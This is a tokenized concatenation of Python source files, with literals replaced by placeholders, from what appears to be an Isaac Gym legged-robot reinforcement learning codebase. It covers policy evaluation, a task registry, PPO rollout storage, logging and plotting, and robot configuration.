. terrain_dict = { "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : <NUM_LIT> } <EOL> env_cfg . terrain . terrain_proportions = list ( env_cfg . terrain . terrain_dict . values ( ) ) <EOL> env_cfg . terrain . curriculum = False <EOL> env_cfg . terrain . max_difficulty = False <EOL> env_cfg . depth . angle = [ <NUM_LIT> , <NUM_LIT> ] <EOL> env_cfg . noise . add_noise = True <EOL> env_cfg . domain_rand . randomize_friction = True <EOL> env_cfg . domain_rand . push_robots = True <EOL> env_cfg . domain_rand . push_interval_s = <NUM_LIT> <EOL> env_cfg . domain_rand . randomize_base_mass = False <EOL> env_cfg . domain_rand . randomize_base_com = False <EOL> depth_latent_buffer = [ ] <EOL> env : LeggedRobot <EOL> env , _ = task_registry . make_env ( name = args . task , args = args , env_cfg = env_cfg ) <EOL> obs = env . get_observations ( ) <EOL> if args . web : <EOL> web_viewer . setup ( env ) <EOL> train_cfg . runner . resume = True <EOL> ppo_runner , train_cfg , log_pth = task_registry . make_alg_runner ( log_root = log_pth , env = env , name = args . task , args = args , train_cfg = train_cfg , return_log_dir = True ) <EOL> policy = ppo_runner . get_inference_policy ( device = env . device ) <EOL> if env . cfg . depth . use_camera : <EOL> depth_encoder = ppo_runner . get_depth_encoder_inference_policy ( device = env . device ) <EOL> total_steps = <NUM_LIT> <EOL> rewbuffer = deque ( maxlen = total_steps ) <EOL> lenbuffer = deque ( maxlen = total_steps ) <EOL> num_waypoints_buffer = deque ( maxlen = total_steps ) <EOL> time_to_fall_buffer = deque ( maxlen = total_steps ) <EOL> edge_violation_buffer = deque ( maxlen = total_steps ) <EOL> cur_reward_sum = torch . zeros ( env . num_envs , dtype = torch . float , device = env . device ) <EOL> cur_episode_length = torch . zeros ( env . num_envs , dtype = torch . float , device = env . device ) <EOL> cur_edge_violation = torch . zeros ( env . num_envs , dtype = torch . float , device = env . device ) <EOL> cur_time_from_start = torch . zeros ( env . num_envs , dtype = torch . float , device = env . device ) <EOL> actions = torch . zeros ( env . num_envs , <NUM_LIT> , device = env . device , requires_grad = False ) <EOL> infos = { } <EOL> infos [ "<STR_LIT>" ] = env . depth_buffer . clone ( ) . to ( ppo_runner . device ) [ : , - <NUM_LIT> ] if ppo_runner . if_depth else None <EOL> for i in tqdm ( range ( <NUM_LIT> ) ) : <EOL> if env . cfg . depth . use_camera : <EOL> if infos [ "<STR_LIT>" ] is not None : <EOL> obs_student = obs [ : , : env . cfg . env . n_proprio ] <EOL> obs_student [ : , <NUM_LIT> : <NUM_LIT> ] = <NUM_LIT> <EOL> with torch . no_grad ( ) : <EOL> depth_latent_and_yaw = depth_encoder ( infos [ "<STR_LIT>" ] , obs_student ) <EOL> depth_latent = depth_latent_and_yaw [ : , : - <NUM_LIT> ] <EOL> yaw = depth_latent_and_yaw [ : , - <NUM_LIT> : ] <EOL> obs [ : , <NUM_LIT> : <NUM_LIT> ] = <NUM_LIT> * yaw <EOL> else : <EOL> depth_latent = None <EOL> if hasattr ( ppo_runner . alg , "<STR_LIT>" ) : <EOL> with torch . no_grad ( ) : <EOL> actions = ppo_runner . alg . depth_actor ( obs . detach ( ) , hist_encoding = True , scandots_latent = depth_latent ) <EOL> else : <EOL> actions = policy ( obs . detach ( ) , hist_encoding = True , scandots_latent = depth_latent ) <EOL> cur_goal_idx = env . cur_goal_idx . clone ( ) <EOL> obs , _ , rews , dones , infos = env . step ( actions . detach ( ) ) <EOL> if args . web : <EOL> web_viewer . render ( fetch_results = True , <EOL> step_graphics = True , <EOL> render_all_camera_sensors = True , <EOL> wait_for_page_load = True ) <EOL> id = env . lookat_id <EOL> edge_violation_buffer . extend ( env . feet_at_edge . sum ( dim = <NUM_LIT> ) . float ( ) . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> cur_reward_sum += rews <EOL> cur_episode_length += <NUM_LIT> <EOL> cur_time_from_start += <NUM_LIT> <EOL> new_ids = ( dones > <NUM_LIT> ) . nonzero ( as_tuple = False ) <EOL> killed_ids = ( ( dones > <NUM_LIT> ) & ( ~ infos [ "<STR_LIT>" ] ) ) . nonzero ( as_tuple = False ) <EOL> rewbuffer . extend ( cur_reward_sum [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> lenbuffer . extend ( cur_episode_length [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> num_waypoints_buffer . extend ( cur_goal_idx [ new_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> time_to_fall_buffer . extend ( cur_time_from_start [ killed_ids ] [ : , <NUM_LIT> ] . cpu ( ) . numpy ( ) . tolist ( ) ) <EOL> cur_reward_sum [ new_ids ] = <NUM_LIT> <EOL> cur_episode_length [ new_ids ] = <NUM_LIT> <EOL> cur_edge_violation [ new_ids ] = <NUM_LIT> <EOL> cur_time_from_start [ killed_ids ] = <NUM_LIT> <EOL> rew_mean = statistics . mean ( rewbuffer ) <EOL> rew_std = statistics . stdev ( rewbuffer ) <EOL> len_mean = statistics . mean ( lenbuffer ) <EOL> len_std = statistics . stdev ( lenbuffer ) <EOL> num_waypoints_mean = np . mean ( np . array ( num_waypoints_buffer ) . astype ( float ) / <NUM_LIT> ) <EOL> num_waypoints_std = np . std ( np . array ( num_waypoints_buffer ) . astype ( float ) / <NUM_LIT> ) <EOL> edge_violation_mean = np . mean ( edge_violation_buffer ) <EOL> edge_violation_std = np . std ( edge_violation_buffer ) <EOL> print ( "<STR_LIT>" . format ( rew_mean , rew_std ) ) <EOL> print ( "<STR_LIT>" . format ( len_mean , len_std ) ) <EOL> print ( "<STR_LIT>" . format ( num_waypoints_mean , num_waypoints_std ) ) <EOL> print ( "<STR_LIT>" . format ( edge_violation_mean , edge_violation_std ) ) <EOL> if __name__ == '<STR_LIT>' : <EOL> EXPORT_POLICY = False <EOL> RECORD_FRAMES = False <EOL> MOVE_CAMERA = False <EOL> args = get_args ( ) <EOL> play ( args ) <EOL> </s>
<s> from copy import deepcopy <EOL> import os <EOL> from datetime import datetime <EOL> from typing import Tuple <EOL> import torch <EOL> import numpy as np <EOL> from rsl_rl . env import VecEnv <EOL> from rsl_rl . runners import OnPolicyRunner <EOL> from legged_gym import LEGGED_GYM_ROOT_DIR , LEGGED_GYM_ENVS_DIR <EOL> from . helpers import get_args , update_cfg_from_args , class_to_dict , get_load_path , set_seed , parse_sim_params <EOL> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg , LeggedRobotCfgPPO <EOL> class TaskRegistry ( ) : <EOL> def __init__ ( self ) : <EOL> self . task_classes = { } <EOL> self . env_cfgs = { } <EOL> self . train_cfgs = { } <EOL> def register ( self , name : str , task_class : VecEnv , env_cfg : LeggedRobotCfg , train_cfg : LeggedRobotCfgPPO ) : <EOL> self . task_classes [ name ] = task_class <EOL> self . env_cfgs [ name ] = env_cfg <EOL> self . train_cfgs [ name ] = train_cfg <EOL> def get_task_class ( self , name : str ) -> VecEnv : <EOL> return self . task_classes [ name ] <EOL> def get_cfgs ( self , name ) -> Tuple [ LeggedRobotCfg , LeggedRobotCfgPPO ] : <EOL> train_cfg = self . train_cfgs [ name ] <EOL> env_cfg = self . env_cfgs [ name ] <EOL> env_cfg . seed = train_cfg . seed <EOL> return env_cfg , train_cfg <EOL> def make_env ( self , name , args = None , env_cfg = None ) -> Tuple [ VecEnv , LeggedRobotCfg ] : <EOL> if args is None : <EOL> args = get_args ( ) <EOL> if name in self . task_classes : <EOL> task_class = self . get_task_class ( name ) <EOL> else : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> if env_cfg is None : <EOL> env_cfg , _ = self . get_cfgs ( name ) <EOL> env_cfg , _ = update_cfg_from_args ( env_cfg , None , args ) <EOL> set_seed ( env_cfg . seed ) <EOL> sim_params = { "<STR_LIT>" : class_to_dict ( env_cfg . sim ) } <EOL> sim_params = parse_sim_params ( args , sim_params ) <EOL> env = task_class ( cfg = env_cfg , <EOL> sim_params = sim_params , <EOL> physics_engine = args . physics_engine , <EOL> sim_device = args . sim_device , <EOL> headless = args . headless ) <EOL> return env , env_cfg <EOL> def make_alg_runner ( self , env , name = None , args = None , train_cfg = None , init_wandb = True , log_root = "<STR_LIT>" , ** kwargs ) -> Tuple [ OnPolicyRunner , LeggedRobotCfgPPO ] : <EOL> if args is None : <EOL> args = get_args ( ) <EOL> if train_cfg is None : <EOL> if name is None : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> _ , train_cfg = self . get_cfgs ( name ) <EOL> else : <EOL> if name is not None : <EOL> print ( f"<STR_LIT>" ) <EOL> _ , train_cfg = update_cfg_from_args ( None , train_cfg , args ) <EOL> if log_root == "<STR_LIT>" : <EOL> log_root = os . path . join ( LEGGED_GYM_ROOT_DIR , '<STR_LIT>' , train_cfg . runner . experiment_name ) <EOL> log_dir = os . path . join ( log_root , datetime . now ( ) . strftime ( '<STR_LIT>' ) + '<STR_LIT>' + train_cfg . runner . run_name ) <EOL> elif log_root is None : <EOL> log_dir = None <EOL> else : <EOL> log_dir = log_root <EOL> train_cfg_dict = class_to_dict ( train_cfg ) <EOL> runner = OnPolicyRunner ( env , <EOL> train_cfg_dict , <EOL> log_dir , <EOL> init_wandb = init_wandb , <EOL> device = args . rl_device , ** kwargs ) <EOL> resume = train_cfg . runner . resume <EOL> if args . resumeid : <EOL> log_root = LEGGED_GYM_ROOT_DIR + f"<STR_LIT>" + args . resumeid <EOL> resume = True <EOL> if resume : <EOL> print ( log_root ) <EOL> print ( train_cfg . runner . load_run ) <EOL> resume_path = get_load_path ( log_root , load_run = train_cfg . runner . load_run , checkpoint = train_cfg . runner . checkpoint ) <EOL> runner . load ( resume_path ) <EOL> if not train_cfg . policy . continue_from_last_std : <EOL> runner . alg . actor_critic . reset_std ( train_cfg . policy . init_noise_std , <NUM_LIT> , device = runner . device ) <EOL> if "<STR_LIT>" in kwargs : <EOL> return runner , train_cfg , os . path . dirname ( resume_path ) <EOL> else : <EOL> return runner , train_cfg <EOL> task_registry = TaskRegistry ( ) <EOL> </s>
<s> import torch <EOL> from torch import Tensor <EOL> import numpy as np <EOL> from isaacgym . torch_utils import quat_apply , normalize <EOL> from typing import Tuple <EOL> def quat_apply_yaw ( quat , vec ) : <EOL> quat_yaw = quat . clone ( ) . view ( - <NUM_LIT> , <NUM_LIT> ) <EOL> quat_yaw [ : , : <NUM_LIT> ] = <NUM_LIT> <EOL> quat_yaw = normalize ( quat_yaw ) <EOL> return quat_apply ( quat_yaw , vec ) <EOL> def wrap_to_pi ( angles ) : <EOL> angles %= <NUM_LIT> * np . pi <EOL> angles -= <NUM_LIT> * np . pi * ( angles > np . pi ) <EOL> return angles <EOL> def torch_rand_sqrt_float ( lower , upper , shape , device ) : <EOL> r = <NUM_LIT> * torch . rand ( * shape , device = device ) - <NUM_LIT> <EOL> r = torch . where ( r < <NUM_LIT> , - torch . sqrt ( - r ) , torch . sqrt ( r ) ) <EOL> r = ( r + <NUM_LIT> ) / <NUM_LIT> <EOL> return ( upper - lower ) * r + lower <EOL> def torch_rand_int ( lower , upper , shape , device ) : <EOL> return ( ( upper - lower ) * torch . rand ( * shape , device = device ) . squeeze ( <NUM_LIT> ) + lower ) . long ( ) . float ( ) <EOL> def sample_unit_vector ( n , dim , device ) : <EOL> tensor = torch . randn ( n , dim , device = device ) <EOL> unit_vector = tensor / torch . norm ( tensor , dim = - <NUM_LIT> , keepdim = True ) <EOL> return unit_vector <EOL> </s>
<s> from . utils import split_and_pad_trajectories , unpad_trajectories <EOL> </s>
<s> import torch <EOL> from torch . utils . data . sampler import BatchSampler , SubsetRandomSampler <EOL> class ObsStorage : <EOL> def __init__ ( self , num_envs , num_transitions_per_env , obs_shape , action_shape , device ) : <EOL> self . device = device <EOL> self . obs = torch . zeros ( num_transitions_per_env , num_envs , * obs_shape ) . to ( self . device ) <EOL> self . expert = torch . zeros ( num_transitions_per_env , num_envs , * action_shape ) . to ( self . device ) <EOL> self . device = device <EOL> self . num_envs = num_envs <EOL> self . num_transitions_per_env = num_transitions_per_env <EOL> self . step = <NUM_LIT> <EOL> def add_obs ( self , obs , expert_action ) : <EOL> if self . step >= self . num_transitions_per_env : <EOL> raise AssertionError ( "<STR_LIT>" ) <EOL> self . obs [ self . step ] . copy_ ( torch . from_numpy ( obs ) . to ( self . device ) ) <EOL> self . expert [ self . step ] . copy_ ( expert_action ) <EOL> self . step += <NUM_LIT> <EOL> def clear ( self ) : <EOL> self . step = <NUM_LIT> <EOL> def mini_batch_generator_shuffle ( self , num_mini_batches ) : <EOL> batch_size = self . num_envs * self . num_transitions_per_env <EOL> mini_batch_size = batch_size // num_mini_batches <EOL> for indices in BatchSampler ( SubsetRandomSampler ( range ( batch_size ) ) , mini_batch_size , drop_last = True ) : <EOL> obs_batch = self . obs . view ( - <NUM_LIT> , * self . obs . size ( ) [ <NUM_LIT> : ] ) [ indices ] <EOL> expert_action_batch = self . expert . view ( - <NUM_LIT> , * self . expert . size ( ) [ <NUM_LIT> : ] ) [ indices ] <EOL> yield obs_batch , expert_actions_batch <EOL> def mini_batch_generator_inorder ( self , num_mini_batches ) : <EOL> batch_size = self . num_envs * self . num_transitions_per_env <EOL> mini_batch_size = batch_size // num_mini_batches <EOL> for batch_id in range ( num_mini_batches ) : <EOL> yield self . obs . view ( - <NUM_LIT> , * self . obs . size ( ) [ <NUM_LIT> : ] ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . expert . view ( - <NUM_LIT> , * self . expert . size ( ) [ <NUM_LIT> : ] ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] <EOL> class RolloutStorage : <EOL> def __init__ ( self , num_envs , num_transitions_per_env , actor_obs_shape , critic_obs_shape , actions_shape , device ) : <EOL> self . device = device <EOL> self . critic_obs = torch . zeros ( num_transitions_per_env , num_envs , * actor_obs_shape ) . to ( self . device ) <EOL> self . actor_obs = torch . zeros ( num_transitions_per_env , num_envs , * critic_obs_shape ) . to ( self . device ) <EOL> self . rewards = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> ) . to ( self . device ) <EOL> self . actions = torch . zeros ( num_transitions_per_env , num_envs , * actions_shape ) . to ( self . device ) <EOL> self . dones = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> ) . byte ( ) . to ( self . device ) <EOL> self . actions_log_prob = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> ) . to ( self . device ) <EOL> self . values = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> ) . to ( self . device ) <EOL> self . returns = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> ) . to ( self . device ) <EOL> self . advantages = torch . zeros ( num_transitions_per_env , num_envs , <NUM_LIT> ) . to ( self . device ) <EOL> self . num_transitions_per_env = num_transitions_per_env <EOL> self . num_envs = num_envs <EOL> self . device = device <EOL> self . step = <NUM_LIT> <EOL> def add_transitions ( self , actor_obs , critic_obs , actions , rewards , dones , values , actions_log_prob ) : <EOL> if self . step >= self . num_transitions_per_env : <EOL> raise AssertionError ( "<STR_LIT>" ) <EOL> self . critic_obs [ self . step ] . copy_ ( torch . from_numpy ( critic_obs ) . to ( self . device ) ) <EOL> self . actor_obs [ self . step ] . copy_ ( torch . from_numpy ( actor_obs ) . to ( self . device ) ) <EOL> self . actions [ self . step ] . copy_ ( actions . to ( self . device ) ) <EOL> self . rewards [ self . step ] . copy_ ( torch . from_numpy ( rewards ) . view ( - <NUM_LIT> , <NUM_LIT> ) . to ( self . device ) ) <EOL> self . dones [ self . step ] . copy_ ( torch . from_numpy ( dones ) . view ( - <NUM_LIT> , <NUM_LIT> ) . to ( self . device ) ) <EOL> self . values [ self . step ] . copy_ ( values . to ( self . device ) ) <EOL> self . actions_log_prob [ self . step ] . copy_ ( actions_log_prob . view ( - <NUM_LIT> , <NUM_LIT> ) . to ( self . device ) ) <EOL> self . step += <NUM_LIT> <EOL> def clear ( self ) : <EOL> self . step = <NUM_LIT> <EOL> def compute_returns ( self , last_values , gamma , lam ) : <EOL> advantage = <NUM_LIT> <EOL> for step in reversed ( range ( self . num_transitions_per_env ) ) : <EOL> if step == self . num_transitions_per_env - <NUM_LIT> : <EOL> next_values = last_values <EOL> else : <EOL> next_values = self . values [ step + <NUM_LIT> ] <EOL> next_is_not_terminal = <NUM_LIT> - self . dones [ step ] . float ( ) <EOL> delta = self . rewards [ step ] + next_is_not_terminal * gamma * next_values - self . values [ step ] <EOL> advantage = delta + next_is_not_terminal * gamma * lam * advantage <EOL> self . returns [ step ] = advantage + self . values [ step ] <EOL> self . advantages = self . returns - self . values <EOL> self . advantages = ( self . advantages - self . advantages . mean ( ) ) / ( self . advantages . std ( ) + <NUM_LIT> ) <EOL> def mini_batch_generator_shuffle ( self , num_mini_batches ) : <EOL> batch_size = self . num_envs * self . num_transitions_per_env <EOL> mini_batch_size = batch_size // num_mini_batches <EOL> for indices in BatchSampler ( SubsetRandomSampler ( range ( batch_size ) ) , mini_batch_size , drop_last = True ) : <EOL> actor_obs_batch = self . actor_obs . view ( - <NUM_LIT> , * self . actor_obs . size ( ) [ <NUM_LIT> : ] ) [ indices ] <EOL> critic_obs_batch = self . critic_obs . view ( - <NUM_LIT> , * self . critic_obs . size ( ) [ <NUM_LIT> : ] ) [ indices ] <EOL> actions_batch = self . actions . view ( - <NUM_LIT> , self . actions . size ( - <NUM_LIT> ) ) [ indices ] <EOL> values_batch = self . values . view ( - <NUM_LIT> , <NUM_LIT> ) [ indices ] <EOL> returns_batch = self . returns . view ( - <NUM_LIT> , <NUM_LIT> ) [ indices ] <EOL> old_actions_log_prob_batch = self . actions_log_prob . view ( - <NUM_LIT> , <NUM_LIT> ) [ indices ] <EOL> advantages_batch = self . advantages . view ( - <NUM_LIT> , <NUM_LIT> ) [ indices ] <EOL> yield actor_obs_batch , critic_obs_batch , actions_batch , values_batch , advantages_batch , returns_batch , old_actions_log_prob_batch <EOL> def mini_batch_generator_inorder ( self , num_mini_batches ) : <EOL> batch_size = self . num_envs * self . num_transitions_per_env <EOL> mini_batch_size = batch_size // num_mini_batches <EOL> for batch_id in range ( num_mini_batches ) : <EOL> yield self . actor_obs . view ( - <NUM_LIT> , * self . actor_obs . size ( ) [ <NUM_LIT> : ] ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . critic_obs . view ( - <NUM_LIT> , * self . critic_obs . size ( ) [ <NUM_LIT> : ] ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . actions . view ( - <NUM_LIT> , self . actions . size ( - <NUM_LIT> ) ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . values . view ( - <NUM_LIT> , <NUM_LIT> ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . advantages . view ( - <NUM_LIT> , <NUM_LIT> ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . returns . view ( - <NUM_LIT> , <NUM_LIT> ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] , self . actions_log_prob . view ( - <NUM_LIT> , <NUM_LIT> ) [ batch_id * mini_batch_size : ( batch_id + <NUM_LIT> ) * mini_batch_size ] <EOL> </s>
<s> import matplotlib . pyplot as plt <EOL> import numpy as np <EOL> from collections import defaultdict <EOL> from multiprocessing import Process , Value <EOL> class Logger : <EOL> def __init__ ( self , dt ) : <EOL> self . state_log = defaultdict ( list ) <EOL> self . rew_log = defaultdict ( list ) <EOL> self . dt = dt <EOL> self . num_episodes = <NUM_LIT> <EOL> self . plot_process = None <EOL> def log_state ( self , key , value ) : <EOL> self . state_log [ key ] . append ( value ) <EOL> def log_states ( self , dict ) : <EOL> for key , value in dict . items ( ) : <EOL> self . log_state ( key , value ) <EOL> def log_rewards ( self , dict , num_episodes ) : <EOL> for key , value in dict . items ( ) : <EOL> if '<STR_LIT>' in key : <EOL> self . rew_log [ key ] . append ( value . item ( ) * num_episodes ) <EOL> self . num_episodes += num_episodes <EOL> def reset ( self ) : <EOL> self . state_log . clear ( ) <EOL> self . rew_log . clear ( ) <EOL> def plot_states ( self ) : <EOL> self . plot_process = Process ( target = self . _plot ) <EOL> self . plot_process . start ( ) <EOL> def _plot ( self ) : <EOL> nb_rows = <NUM_LIT> <EOL> nb_cols = <NUM_LIT> <EOL> fig , axs = plt . subplots ( nb_rows , nb_cols ) <EOL> for key , value in self . state_log . items ( ) : <EOL> time = np . linspace ( <NUM_LIT> , len ( value ) * self . dt , len ( value ) ) <EOL> break <EOL> log = self . state_log <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] : <EOL> forces = np . array ( log [ "<STR_LIT>" ] ) <EOL> for i in range ( forces . shape [ <NUM_LIT> ] ) : <EOL> a . plot ( time , forces [ : , i ] , label = f'<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] != [ ] and log [ "<STR_LIT>" ] != [ ] : a . plot ( log [ "<STR_LIT>" ] , log [ "<STR_LIT>" ] , '<STR_LIT>' , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> a = axs [ <NUM_LIT> , <NUM_LIT> ] <EOL> if log [ "<STR_LIT>" ] != [ ] : a . plot ( time , log [ "<STR_LIT>" ] , label = '<STR_LIT>' ) <EOL> a . set ( xlabel = '<STR_LIT>' , ylabel = '<STR_LIT>' , title = '<STR_LIT>' ) <EOL> a . legend ( ) <EOL> plt . show ( ) <EOL> def print_rewards ( self ) : <EOL> print ( "<STR_LIT>" ) <EOL> for key , values in self . rew_log . items ( ) : <EOL> mean = np . sum ( np . array ( values ) ) / self . num_episodes <EOL> print ( f"<STR_LIT>" ) <EOL> print ( f"<STR_LIT>" ) <EOL> def __del__ ( self ) : <EOL> if self . plot_process is not None : <EOL> self . plot_process . kill ( ) <EOL> </s>
<s> from legged_gym . envs . base . legged_robot_config import LeggedRobotCfg , LeggedRobotCfgPPO <EOL> class A1RoughCfg ( LeggedRobotCfg ) : <EOL> class init_state ( LeggedRobotCfg . init_state ) : <EOL> pos = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> default_joint_angles = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> '<STR_LIT>' : - <NUM_LIT> , <EOL> } <EOL> class control ( LeggedRobotCfg . control ) : <EOL> control_type = '<STR_LIT>' <EOL> stiffness = { '<STR_LIT>' : <NUM_LIT> } <EOL> damping = { '<STR_LIT>' : <NUM_LIT> } <EOL> action_scale = <NUM_LIT> <EOL> decimation = <NUM_LIT> <EOL> class asset ( LeggedRobotCfg . asset ) : <EOL> file = '<STR_LIT>' <EOL> foot_name = "<STR_LIT>" <EOL> penalize_contacts_on = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> terminate_after_contacts_on = [ "<STR_LIT>" ] <EOL> self_collisions = <NUM_LIT> <EOL> class rewards ( LeggedRobotCfg . rewards ) : <EOL> soft_dof_pos_limit = <NUM_LIT> <EOL> base_height_target = <NUM_LIT> <EOL> class scales ( LeggedRobotCfg . rewards . scales ) : <EOL> torques = <NUM_LIT> <EOL> dof_pos_limits = - <NUM_LIT> <EOL> class A1RoughCfgPPO ( LeggedRobotCfgPPO ) : <EOL> class algorithm ( LeggedRobotCfgPPO . algorithm ) : <EOL> entropy_coef = <NUM_LIT> <EOL> class runner ( LeggedRobotCfgPPO . runner ) : <EOL> run_name = '<STR_LIT>' <EOL> experiment_name = '<STR_LIT>' <EOL> </s>
<s> import sys <EOL> from isaacgym import gymapi <EOL> from isaacgym import gymutil , gymtorch <EOL> import numpy as np <EOL> import torch <EOL> import time <EOL> class BaseTask ( ) : <EOL> def __init__ ( self , cfg , sim_params , physics_engine , sim_device , headless ) : <EOL> self . gym = gymapi . acquire_gym ( ) <EOL> self . sim_params = sim_params <EOL> self . physics_engine = physics_engine <EOL> self . sim_device = sim_device <EOL> sim_device_type , self . sim_device_id = gymutil . parse_device_str ( self . sim_device ) <EOL> self . headless = headless <EOL> if sim_device_type == '<STR_LIT>' and sim_params . use_gpu_pipeline : <EOL> self . device = self . sim_device <EOL> else : <EOL> self . device = '<STR_LIT>' <EOL> self . graphics_device_id = self . sim_device_id <EOL> if self . headless == True : <EOL> self . graphics_device_id = - <NUM_LIT> <EOL> self . num_envs = cfg . env . num_envs <EOL> self . num_obs = cfg . env . num_observations <EOL> self . num_privileged_obs = cfg . env . num_privileged_obs <EOL> self . num_actions = cfg . env . num_actions <EOL> torch . _C . _jit_set_profiling_mode ( False ) <EOL> torch . _C . _jit_set_profiling_executor ( False ) <EOL> self . obs_buf = torch . zeros ( self . num_envs , self . num_obs , device = self . device , dtype = torch . float ) <EOL> self . rew_buf = torch . zeros ( self . num_envs , device = self . device , dtype = torch . float ) <EOL> self . reset_buf = torch . ones ( self . num_envs , device = self . device , dtype = torch . long ) <EOL> self . episode_length_buf = torch . zeros ( self . num_envs , device = self . device , dtype = torch . long ) <EOL> self . time_out_buf = torch . zeros ( self . num_envs , device = self . device , dtype = torch . bool ) <EOL> if self . num_privileged_obs is not None : <EOL> self . privileged_obs_buf = torch . zeros ( self . num_envs , self . num_privileged_obs , device = self . device , dtype = torch . float ) <EOL> else : <EOL> self . privileged_obs_buf = None <EOL> self . extras = { } <EOL> self . create_sim ( ) 